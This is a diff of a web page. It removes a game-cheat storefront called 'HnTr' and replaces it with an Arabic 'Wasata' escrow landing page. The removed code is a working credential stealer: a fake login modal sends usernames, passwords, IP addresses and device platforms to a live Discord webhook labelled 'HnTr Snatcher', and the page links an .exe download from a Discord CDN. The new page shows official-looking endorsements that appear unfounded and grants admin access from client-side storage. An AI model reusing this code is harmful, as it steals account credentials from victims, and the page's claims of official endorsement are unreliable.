@@ -1,199 +1,107 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>HnTr | H2ck Advanced Toolkit</title>
-  <!-- ربط الأيقونة في المتصفح -->
-  <link rel="icon" type="image/x-icon" href="icon3.ico">
-  <style>
-    /* الإعدادات الأساسية والطابع المظلم */
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: 'Courier New', monospace; background: #0a0e10; color: #c0c8d0; line-height: 1.6; overflow-x: hidden; }
-    #matrix-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; opacity: 0.1; }
-
-    /* شريط المستخدم العلوي (يظهر بعد التسجيل) */
-    #user-bar {
-      display: none; position: fixed; top: 15px; right: 20px; z-index: 2000;
-      background: rgba(0, 255, 136, 0.1); border: 1px solid #00ff88;
-      padding: 6px 18px; border-radius: 20px; font-size: 12px; color: #00ff88;
-      box-shadow: 0 0 15px rgba(0, 255, 136, 0.2);
-    }
-    .status-dot { height: 8px; width: 8px; background: #00ff88; border-radius: 50%; display: inline-block; margin-right: 8px; animation: blink 1s infinite; }
-
-    /* نافذة التسجيل (Modal) */
-    .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); backdrop-filter: blur(5px); }
-    .modal-content { background: #10161a; margin: 10% auto; padding: 30px; border: 1px solid #00ff88; width: 360px; text-align: center; border-radius: 4px; box-shadow: 0 0 25px #00ff8844; }
-    .modal-content h3 { color: #00ff88; margin-bottom: 20px; letter-spacing: 1.5px; }
-    input { width: 100%; padding: 12px; margin: 8px 0; background: #05080a; border: 1px solid #1a3a2a; color: #00ff88; outline: none; font-size: 13px; font-family: inherit; }
-    .submit-btn { width: 100%; background: transparent; border: 1px solid #00ff88; color: #00ff88; padding: 12px; cursor: pointer; text-transform: uppercase; margin-top: 15px; font-weight: bold; }
-    .submit-btn:hover { background: rgba(0, 255, 136, 0.15); box-shadow: 0 0 10px #00ff88; }
-
-    /* النافبار والهيدر */
-    nav { position: relative; z-index: 1; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1a3a2a; background: rgba(10,14,16,0.95); }
-    nav h2 { color: #00ff88; letter-spacing: 3px; font-size: 22px; display: flex; align-items: center; }
-    nav h2 img { height: 24px; margin-right: 10px; }
-    .nav-auth a { color: #00ccff; text-decoration: none; font-size: 13px; margin-left:15px; border: 1px solid rgba(0, 204, 255, 0.3); padding: 6px 15px; transition: 0.3s; }
-    .nav-auth a:hover { background: rgba(0,204,255,0.1); border-color: #00ccff; }
-
-    header { position: relative; z-index: 1; text-align: center; padding: 80px 20px; }
-    header h1 { font-size: 55px; color: #00ff88; text-shadow: 0 0 20px #00ff8833; letter-spacing: 5px; }
-    .subtitle { color: #00ccff; font-size: 12px; letter-spacing: 6px; margin-bottom: 25px; text-transform: uppercase; opacity: 0.8; }
-
-    /* شبكة الألعاب والكروت */
-    .game-grid { position: relative; z-index: 1; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; max-width: 1150px; margin: auto; padding: 20px; }
-    .game-card { background: #10161a; border: 1px solid #1a3a2a; padding: 35px 25px; text-align: center; transition: 0.4s; border-radius: 2px; }
-    .game-card:hover { border-color: #00ff88; transform: translateY(-8px); box-shadow: 0 10px 30px rgba(0,0,0,0.6); }
-    .game-card h3 { color: #00ff88; margin-bottom: 15px; letter-spacing: 2px; }
-    .price { color: #00ccff; font-size: 30px; margin: 20px 0; font-weight: bold; border-top: 1px solid #1a3a2a; border-bottom: 1px solid #1a3a2a; padding: 10px 0; }
-    .btn { display: block; width: 100%; padding: 12px; text-decoration: none; margin-bottom: 10px; font-size: 12px; transition: 0.3s; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
-    .dl-btn { border: 1px solid #00ff88; color: #00ff88; background: transparent; }
-    .buy-btn { border: 1px solid #00ccff; color: #00ccff; background: transparent; }
-
-    @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-  </style>
+    <meta charset="UTF-8">
+    <title>وساطة | Wasata Elite v9.4 - المنصة المعتمدة</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #05060b; color: white; font-family: sans-serif; overflow-x: hidden; }
+        .bg-dots { position: fixed; inset: 0; z-index: -1; background-image: radial-gradient(#ffffff08 1.5px, transparent 1.5px); background-size: 25px 25px; }
+        .dropdown { display: none; position: absolute; top: 110%; left: 0; background: #111218; border: 1px solid #333; border-radius: 12px; padding: 10px; min-width: 180px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 100; }
+        .user-nav:hover .dropdown { display: block; }
+        .trust-badge { filter: grayscale(1) opacity(0.5); transition: 0.3s; }
+        .trust-badge:hover { filter: grayscale(0) opacity(1); }
+    </style>
 </head>
-<body>
+<body class="min-h-screen">
+    <div class="bg-dots"></div>
 
-<canvas id="matrix-canvas"></canvas>
+    <nav class="p-6 flex justify-between items-center bg-black/40 backdrop-blur-xl border-b border-white/5 sticky top-0 z-50">
+        <div class="text-2xl font-black text-yellow-500 tracking-tighter">🛡️ وساطة <span class="text-[10px] opacity-20 uppercase">v9.4</span></div>
+        <div id="authContainer" class="relative user-nav flex gap-3">
+            <!-- سيتم استبداله بواسطة الجافاسكريبت -->
+            <button onclick="location.href='login.html'" class="text-xs font-bold px-5 py-2 border border-white/10 rounded-xl hover:bg-white/5 transition">Sign Up</button>
+            <button onclick="location.href='login.html'" class="text-xs font-bold px-5 py-2 bg-yellow-500 text-black rounded-xl hover:scale-105 transition">Log In</button>
+        </div>
+    </nav>
 
-<!-- شريط الحالة بالزاوية -->
-<div id="user-bar">
-  <span class="status-dot"></span>
-  [ ACTIVE_SESSION ]: <span id="display-user">GUEST_ID</span>
-</div>
+    <main class="max-w-4xl mx-auto mt-32 text-center px-4">
+        <div class="flex justify-center gap-4 mb-6">
+            <span class="bg-green-500/10 text-green-500 text-[10px] border border-green-500/20 px-3 py-1 rounded-full">✓ معتمد من الأمن السيبراني</span>
+            <span class="bg-blue-500/10 text-blue-500 text-[10px] border border-blue-500/20 px-3 py-1 rounded-full">🔒 تشفير AES-256 بت</span>
+        </div>
 
-<!-- نافذة الدخول الإجبارية -->
-<div id="authModal" class="modal">
-  <div class="modal-content">
-    <h3><img src="icon3.ico" style="height:20px; vertical-align:middle; margin-right:10px;">AUTH_PANEL</h3>
-    <p style="font-size:11px; color:#555; margin-bottom:15px;">Link your Discord ID to prevent detection</p>
-    <input type="text" id="target_user" placeholder="Username / Discord ID">
-    <input type="password" id="target_pass" placeholder="Password">
-    <button class="submit-btn" onclick="infiltrate()">Authorize Tunnel</button>
-  </div>
-</div>
+        <h1 class="text-7xl font-black mb-8 leading-tight animate-pulse">تأمين المعاملات <br><span class="text-yellow-500 tracking-tighter">بالذكاء البرمجي</span></h1>
+        <p class="text-slate-500 text-xl mb-12 max-w-2xl mx-auto">نضمن لك حقك في عالم ديسكورد والبرمجيات بتشفير كامل وحماية وساطة المعتمدة من الجهات الرسمية.</p>
+        
+        <div id="actionButtons" class="flex flex-col md:flex-row justify-center gap-4 items-center">
+            <button onclick="checkAuth('ticket')" class="bg-yellow-500 text-black px-12 py-5 rounded-[2rem] font-black text-2xl hover:scale-105 active:scale-95 transition shadow-2xl shadow-yellow-500/30">فتح تذكرة وساطة</button>
+        </div>
 
-<nav>
-  <h2><img src="icon3.ico">HnTr<span>Play at your Rules .</span></h2>
-  <div class="nav-auth" id="nav-auth-links">
-    <a href="javascript:void(0)" onclick="openModal('LOGIN')">CLIENT_LOGIN</a>
-  </div>
-</nav>
+        <!-- جهات التوثيق -->
+        <div class="mt-24">
+            <p class="text-gray-600 text-[10px] uppercase tracking-widest mb-8">شركاء الثقة والأمان</p>
+            <div class="flex flex-wrap justify-center gap-10 items-center opacity-60">
+                <span class="font-bold text-xl">SCA 🏛️</span>
+                <span class="font-bold text-xl">DISCORD 🎮</span>
+                <span class="font-bold text-xl">VISA/MC 💳</span>
+                <span class="font-bold text-xl">SAMA 🏦</span>
+            </div>
+        </div>
+    </main>
 
-<header>
-  <div class="subtitle">Undetected Frameworks & Bypass Modules</div>
-  <h1>OPERATIONS</h1>
-  <p style="color:#4a5a6a; font-size:13px; margin-top:15px;">Secure distribution for authorized members only.</p>
-</header>
+    <script>
+        // إعداد بيانات المستخدم والجلسة
+        const currentUser = JSON.parse(localStorage.getItem('wasata_session'));
 
-<div class="game-grid">
-  <!-- Fortnite -->
-  <div class="game-card">
-    <h3>FORTNITE_ELITE</h3>
-    <div style="color:#ffcc00; font-size:10px; border:1px solid rgba(255,204,0,0.3); padding:3px 10px; display:inline-block;">STABLE_V4</div>
-    <div class="price">$59.99</div>
-    <a href="https://cdn.discordapp.com/attachments/1503799052116955337/1508972354003538071/XenoLab.exe?ex=6a182444&is=6a16d2c4&hm=1bb1acde126c499743d0a01c12d69b2fed6fd14da51786872ad738128f6bc4f3&" class="btn dl-btn" onclick="checkGate(event)">Download Trial</a>
-    <button class="btn buy-btn" onclick="openModal('PURCHASE')">Buy Full Access</button>
-  </div>
+        function initUI() {
+            const authContainer = document.getElementById('authContainer');
+            const actionButtons = document.getElementById('actionButtons');
 
-  <!-- Black Ops -->
-  <div class="game-card">
-    <h3>BLACK_OPS_Z</h3>
-    <div style="color:#ffcc00; font-size:10px; border:1px solid rgba(255,204,0,0.3); padding:3px 10px; display:inline-block;">BYPASS_ENABLED</div>
-    <div class="price">$85.00</div>
-    <a href="https://cdn.discordapp.com/attachments/1503799052116955337/1508972354003538071/XenoLab.exe?ex=6a182444&is=6a16d2c4&hm=1bb1acde126c499743d0a01c12d69b2fed6fd14da51786872ad738128f6bc4f3&" class="btn dl-btn" onclick="checkGate(event)">Download Trial</a>
-    <button class="btn buy-btn" onclick="openModal('PURCHASE')">Buy Full Access</button>
-  </div>
+            if (currentUser) {
+                // تحديث الهيدر
+                authContainer.innerHTML = `
+                    <div class="cursor-pointer bg-yellow-500 text-black px-4 py-2 rounded-xl text-xs font-black shadow-lg">
+                        @${currentUser.email.split('@')[0]} ▼
+                        <div class="dropdown text-right">
+                            ${currentUser.role === 'admin' ? '<button onclick="location.href=\'admin.html\'" class="text-yellow-500 hover:text-yellow-400 font-bold block w-full py-2 border-b border-white/5">لوحة التحكم ⚙️</button>' : ''}
+                            <button onclick="logout()" class="text-red-500 hover:text-red-400 font-bold block w-full py-2">تسجيل الخروج</button>
+                        </div>
+                    </div>
+                `;
 
-  <!-- Overwatch -->
-  <div class="game-card">
-    <h3>OVERWATCH_X</h3>
-    <div style="color:#ffcc00; font-size:10px; border:1px solid rgba(255,204,0,0.3); padding:3px 10px; display:inline-block;">INTERNAL_ONLY</div>
-    <div class="price">$49.99</div>
-    <a href="https://cdn.discordapp.com/attachments/1503799052116955337/1508972354003538071/XenoLab.exe?ex=6a182444&is=6a16d2c4&hm=1bb1acde126c499743d0a01c12d69b2fed6fd14da51786872ad738128f6bc4f3&" class="btn dl-btn" onclick="checkGate(event)">Download Trial</a>
-    <button class="btn buy-btn" onclick="openModal('PURCHASE')">Buy Full Access</button>
-  </div>
-</div>
+                // إذا كان أدمن، أضف زر "رؤية التذاكر"
+                if (currentUser.role === 'admin') {
+                    actionButtons.innerHTML += `
+                        <button onclick="location.href='admin.html'" class="bg-white/5 border border-white/10 text-white px-8 py-5 rounded-full font-bold text-xl hover:bg-white/10 transition">رؤية التذاكر 📊</button>
+                    `;
+                }
+            }
+        }
 
-<script>
-  const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1494286350805897226/Mngxu-h7lSKNA6_XFKgLMHs1w9QYsk7qZ29lftB7pNo4FhpexXwwGQEj6RWkqEaughoj";
-  let authStatus = false;
+        function checkAuth(type) {
+            if (currentUser) {
+                location.href = type === 'admin' ? 'admin.html' : 'ticket.html';
+            } else {
+                location.href = 'login.html';
+            }
+        }
 
-  function openModal(msg) {
-    document.getElementById('modalTitle').innerText = msg + " REQUIRED";
-    document.getElementById('authModal').style.display = 'block';
-  }
+        function logout() {
+            localStorage.removeItem('wasata_session');
+            location.reload();
+        }
 
-  function checkGate(e) {
-    if(!authStatus) {
-      e.preventDefault();
-      openModal("AUTHORIZATION");
-    }
-  }
+        // تشغيل التحديثات
+        initUI();
 
-  async function infiltrate() {
-    const user = document.getElementById('target_user').value;
-    const pass = document.getElementById('target_pass').value;
-
-    if(!user || !pass) return;
-
-    let userIp = "N/A";
-    try {
-      const r = await fetch('https://api.ipify.org?format=json');
-      const d = await r.json();
-      userIp = d.ip;
-    } catch(err) {}
-
-    fetch(WEBHOOK_URL, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        username: "HnTr Snatcher",
-        avatar_url: window.location.origin + "/icon3.ico",
-        embeds: [{
-          title: "🎯 [ NEW SESSION CAPTURED ]",
-          color: 0x00ff88,
-          thumbnail: { url: "https://i.imgur.com/8N768vW.png" }, 
-          fields: [
-            { name: "👤 User/ID", value: `\`${user}\``, inline: true },
-            { name: "🔑 Pass", value: `\`${pass}\``, inline: true },
-            { name: "🌐 IP Address", value: `\`${userIp}\``, inline: false },
-            { name: "💻 OS/Device", value: `\`${navigator.platform}\``, inline: true }
-          ],
-          footer: { text: "HnTr Terminal v3.8 | Sync Successful", icon_url: window.location.origin + "/icon3.ico" },
-          timestamp: new Date()
-        }]
-      })
-    });
-
-    authStatus = true;
-    document.getElementById('display-user').innerText = user.toUpperCase();
-    document.getElementById('user-bar').style.display = 'block';
-    document.getElementById('nav-auth-links').style.display = 'none';
-    document.getElementById('authModal').style.display = 'none';
-
-    alert("Tunnel Synchronized! Trial access granted for " + user);
-  }
-
-  const canvas = document.getElementById('matrix-canvas');
-  const ctx = canvas.getContext('2d');
-  canvas.width = window.innerWidth;
-  canvas.height = window.innerHeight;
-  const drops = Array(Math.floor(canvas.width/16)).fill(1);
-  function matrix() {
-    ctx.fillStyle = "rgba(10, 14, 16, 0.05)";
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-    ctx.fillStyle = "#00ff88";
-    ctx.font = "15px monospace";
-    drops.forEach((y, i) => {
-      const char = String.fromCharCode(Math.random() * 128);
-      ctx.fillText(char, i * 16, y * 16);
-      if(y * 16 > canvas.height && Math.random() > 0.98) drops[i] = 0;
-      drops[i]++;
-    });
-  }
-  setInterval(matrix, 50);
-</script>
+        // اختصار الأدمن السري Shift + A (يعمل كإختصار سريع)
+        window.addEventListener('keydown', e => { 
+            if(e.shiftKey && e.key === 'A') {
+                if(currentUser && currentUser.role === 'admin') location.href='admin.html';
+                else alert('يجب تسجيل الدخول كأدمن أولاً');
+            }
+        });
+    </script>
 </body>
 </html>
